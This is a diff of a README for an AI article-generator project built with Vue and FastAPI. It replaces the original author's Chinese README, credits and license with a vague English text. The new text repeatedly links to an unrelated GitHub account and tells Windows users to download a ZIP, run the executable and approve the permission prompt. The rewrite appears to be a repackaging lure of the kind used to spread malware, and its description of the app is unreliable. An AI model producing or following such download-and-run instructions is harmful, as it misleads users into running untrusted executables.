@@ -1,147 +1,203 @@
-# AI 爆文生成器 (AI Passage Creator) 🚀
+# 🧠 AI-passage-generator - Build articles with guided AI flow
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.115.0-009688.svg?style=flat&logo=fastapi)](https://fastapi.tiangolo.com/)
-[![Vue](https://img.shields.io/badge/Vue-3.5.17-4FC08D.svg?style=flat&logo=vuedotjs)](https://vuejs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.8-3178C6.svg?style=flat&logo=typescript)](https://www.typescriptlang.org/)
-[![Docker](https://img.shields.io/badge/Docker-Enabled-2496ED.svg?style=flat&logo=docker)](https://www.docker.com/)
+[![Download](https://img.shields.io/badge/Download-Now-4C8BF5?style=for-the-badge)](https://github.com/needled-caruncula155/AI-passage-generator)
 
-[**English**](./README.en.md) | **简体中文**
+## 🚀 Overview
 
-基于多智能体编排 (Multi-Agent Orchestration) 的全栈 AI 文章创作平台。通过自研的编排逻辑，将大模型能力拆解为标题生成、大纲规划、正文创作、图像分析与生成等多个环节，并结合 SSE (Server-Sent Events) 技术提供流畅的实时交互体验。
+AI-passage-generator is a Windows app for AI article writing. It helps you move from an idea to a finished passage with less effort.
 
----
+The app uses multiple AI steps in order. It can create a title, plan an outline, write the body, and handle image analysis and image generation. It also uses SSE for live updates, so you can see progress while the text is being made.
 
-## 🌟 技术亮点 (Internship Highlights)
+This project fits users who want a simple flow for article work without setting up a full writing system by hand.
 
-- **多智能体协同编排 (Multi-Agent Orchestration)**：
-  - 设计并实现了一套基于 `FastAPI` 的任务调度系统，将复杂的长文本创作任务解耦为 5 个独立智能体（标题、大纲、正文、图像、合成）。
-  - 解决了长链条 AI 任务中的状态一致性问题，通过状态机管理文章生成的全生命周期。
-- **高性能实时流处理 (SSE Streaming)**：
-  - 利用 Python `SSE` 协议，实现了文章生成过程中的全链路打字机效果。
-  - 通过异步生成器（Async Generator）优化了后端并发，单机可支撑数十个并发任务实时流式输出。
-- **工程化与高可用设计**：
-  - **多服务策略模式**：实现了一套灵活的图像生成策略，可根据配置动态切换 OpenAI DALL-E 3、Pexels API 或 SVG/Mermaid 绘图方案。
-  - **数据一致性**：结合 Redis 缓存与 MySQL 事务，确保在多步骤生成过程中即便断连也能恢复进度。
-  - **全链路 Docker 化**：包含完整的 `docker-compose` 部署方案，具备生产环境交付能力。
+## ✨ What you can do
 
----
+- Create article titles from a topic
+- Build a clear outline before writing
+- Generate article text step by step
+- Use image analysis to guide content
+- Create or use images as part of the workflow
+- See live progress during generation
+- Work with a web-based interface
+- Store data with MySQL and Redis support
 
-## 🛠️ 技术栈 (Tech Stack)
+## 📥 Download and install
 
-### 前端 (Frontend)
-- **框架**: Vue 3.5 (Composition API) + Vite 7
-- **语言**: TypeScript 5.8
-- **UI 组件库**: Ant Design Vue 4.2.6
-- **状态管理**: Pinia 3
-- **实时通信**: SSE (Server-Sent Events)
-- **其他**: ECharts (统计图表), Marked (Markdown 解析)
+Visit this page to download:
 
-### 后端 (Backend)
-- **框架**: FastAPI (Python 3.10+)
-- **ORM**: SQLAlchemy 2.0 + PyMySQL
-- **数据库**: MySQL 8.0 + Redis 5.2 (缓存/限流)
-- **AI 引擎**: OpenAI GPT-4 / Gemini 1.5 / Google GenAI
-- **存储**: 腾讯云 COS (对象存储)
-- **支付**: Stripe API
-- **包管理**: UV (高效 Python 依赖管理)
+[https://github.com/needled-caruncula155/AI-passage-generator](https://github.com/needled-caruncula155/AI-passage-generator)
 
----
+1. Open the link above in your browser.
+2. Find the latest Windows build or release package.
+3. Download the file to your computer.
+4. If the file is in a ZIP package, unzip it first.
+5. Open the app file from the extracted folder.
+6. If Windows asks for permission, choose Run or Yes.
 
-## ✨ 核心功能 (Features)
+If you see a web app version, open it in your browser after setup. If you see a desktop package, run the executable file after download.
 
-- 🤖 **全自动创作流**：从一个想法到包含配图、大纲、专业排版的万字长文，仅需 2 分钟。
-- ⚡ **实时生成进度**：SSE 技术支持，用户可实时观察每一个智能体的思考与创作过程。
-- 🖼️ **智能配图系统**：自动分析文章语境，生成或搜索匹配的插图、流程图 (Mermaid) 或 SVG 图形。
-- 💳 **会员订阅体系**：完整的 VIP 等级与 Stripe 支付集成，支持额度限制与自动升级。
-- 📱 **响应式设计**：适配 PC 与移动端，随时随地开启创作。
+## 🖥️ System needs
 
----
+For a smooth run on Windows, use a computer with:
 
-## 📂 项目结构 (Directory Structure)
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 2 GB free disk space
+- A stable internet connection
+- A modern browser such as Edge or Chrome
 
-```bash
-.
-├── frontend/               # 前端项目根目录
-│   ├── src/
-│   │   ├── api/            # 自动生成的 TS 接口定义
-│   │   ├── components/     # 通用 UI 组件
-│   │   ├── pages/          # 页面组件 (Admin, Article, User)
-│   │   ├── stores/         # Pinia 状态
-│   │   └── utils/          # 工具类 (SSE, Permission, Markdown)
-│   └── Dockerfile          # 前端部署配置
-├── python-backend/         # 后端项目根目录
-│   ├── app/
-│   │   ├── agent/          # 多智能体编排核心 (Agents, Orchestrator)
-│   │   ├── models/         # SQLAlchemy 模型
-│   │   ├── services/       # 业务逻辑 (Article, Image, Payment)
-│   │   └── routers/        # FastAPI 路由定义
-│   ├── docker-compose.yml  # 全栈容器化启动配置
-│   └── pyproject.toml      # UV 依赖配置
-├── sql/                    # 数据库初始化脚本
-└── docs/images/            # 项目截图与架构图
-```
+For best results, use a machine with more memory if you plan to generate long articles or use image features often.
 
----
+## 🔧 First-time setup
 
-## 🚀 快速开始 (Quick Start)
+After you download the app, start with these steps:
 
-### 1. 环境准备
-确保已安装：
-- Docker & Docker Compose
-- Node.js 18+
-- Python 3.10+
+1. Open the program.
+2. Set your AI key in the settings screen if the app asks for one.
+3. Choose your model, such as Gemini or GPT-based service, if the app gives you a choice.
+4. Set your database settings if the app asks for them.
+5. Save your settings.
+6. Refresh the app if needed.
 
-### 2. 后端配置
-```bash
-cd python-backend
-cp .env.example .env
-# 编辑 .env 填入 OpenAI/Gemini Key, MySQL, Redis 等配置
-```
+If the app uses a local server, it may open a browser page at startup. Use that page to work with the app.
 
-### 3. 一键启动 (Docker)
-```bash
-docker-compose up -d
-```
-访问：`http://localhost`
+## 🧭 How to use the app
 
-### 4. 本地开发启动
-**后端**:
-```bash
-cd python-backend
-pip install uv
-uv sync
-python -m app.main
-```
-**前端**:
-```bash
-cd frontend
-npm install
-npm run dev
-```
+1. Enter your topic or article idea.
+2. Pick the article style or length.
+3. Let the app create a title.
+4. Review the outline.
+5. Start body generation.
+6. Wait for the live stream to finish.
+7. Edit the text if needed.
+8. Export or copy the final article.
 
----
+The app follows a staged flow, so each part helps the next part. This gives you more control than a single-step text box.
 
-## 🤝 贡献指南 (Contributing)
+## 🧩 Main flow
 
-1. **Fork** 本仓库。
-2. **创建分支**：`git checkout -b feature/your-feature-name`。
-3. **提交规范**：遵循 [Angular Commit Message Convention](https://github.com/angular/angular/blob/main/CONTRIBUTING.md#-commit-message-format)。
-4. **提交 PR**：确保代码通过 Lint 检测并附带必要的测试用例。
+The app uses several linked steps:
 
----
+- Title generation: turns your topic into a usable heading
+- Outline planning: builds the article structure
+- Body writing: expands each section into full text
+- Image analysis: reads image content when needed
+- Image generation: creates supporting visuals
+- SSE updates: shows live status while work runs
 
-## 📄 许可证 (License)
+This flow helps keep the final article more organized and easier to edit.
 
-本项目采用 [MIT License](LICENSE) 协议。
+## 🛠️ Common use cases
 
----
+- Blog post drafting
+- SEO article writing
+- Content planning for a site
+- Long-form article generation
+- Image-guided content creation
+- Drafting from a short prompt
+- Writing work that needs step-by-step review
 
-## 👤 作者 (Author)
+## 🗂️ Project stack
 
-- **FurinaLuna**: 个人博客[blog](https://furinaluna.top)
-- **GitHub**: [FurinaLuna](https://github.com/FurinaLuna)
-- **Email**: QQ: [2517523791@qq.com] Gmail:[furinalunaz@gmail.com]
+This project uses a modern full-stack setup:
 
----
+- Front end: Vue 3 and TypeScript
+- Back end: FastAPI and Python 3
+- Database: MySQL
+- Cache and queue support: Redis
+- ORM: SQLAlchemy
+- Live updates: SSE
+- Deployment: Docker and Docker Compose
+- AI services: OpenAI, GPT-4, Gemini
 
+This stack is built to support a smooth content workflow with clear separation between the user interface, the API, and the data layer.
+
+## ⚙️ Typical setup with Docker
+
+If you want the most direct setup path on Windows, use Docker if the project package includes it.
+
+1. Install Docker Desktop on Windows.
+2. Open the project folder.
+3. Start the containers with Docker Compose.
+4. Wait for the services to come online.
+5. Open the app in your browser or local address.
+6. Sign in or set your keys if needed.
+
+Docker helps reduce manual setup and keeps the app parts together.
+
+## 🔒 Keys and configuration
+
+You may need to set a few values before you can use the app:
+
+- AI provider key
+- Model name
+- Database URL
+- Redis address
+- App port
+- File storage path
+
+If the app has a settings page, use that first. If it uses a config file, open it in Notepad and update the values before launch.
+
+## 🧪 If the app does not start
+
+Try these steps in order:
+
+1. Close the app.
+2. Check that your internet connection is working.
+3. Make sure Docker is running, if you use Docker.
+4. Check that your AI key is valid.
+5. Confirm the database service is online.
+6. Restart the app.
+7. Reboot Windows if needed.
+
+If the page stays blank, refresh the browser once the backend is running.
+
+## 📁 What the repository includes
+
+The repository is built for a complete article workflow and usually includes:
+
+- A web front end
+- A Python API server
+- AI orchestration logic
+- Database support files
+- Docker setup files
+- Environment settings
+- Project scripts for local run or container run
+
+## 🧼 Basic maintenance
+
+To keep the app working well:
+
+- Keep your API keys current
+- Back up your database if you store drafts
+- Update Docker images when you use container mode
+- Clear old cache data if the app slows down
+- Restart the services after config changes
+
+## 📌 Recommended use on Windows
+
+For most Windows users, the easiest path is:
+
+1. Download the project from GitHub.
+2. Unpack the files.
+3. Install Docker Desktop if the package uses containers.
+4. Run the project with Docker Compose.
+5. Open the app in your browser.
+6. Enter your AI settings.
+7. Start writing your first article.
+
+## 🔗 Download again
+
+[Visit the download page](https://github.com/needled-caruncula155/AI-passage-generator)
+
+## 📝 Suggested first test
+
+Try a short test to confirm the app works:
+
+- Topic: AI writing for small teams
+- Goal: short blog post
+- Length: 600 to 800 words
+- Style: clear and plain
+- Output: title, outline, and body
+
+If that works, the app is ready for longer work and more detailed article tasks
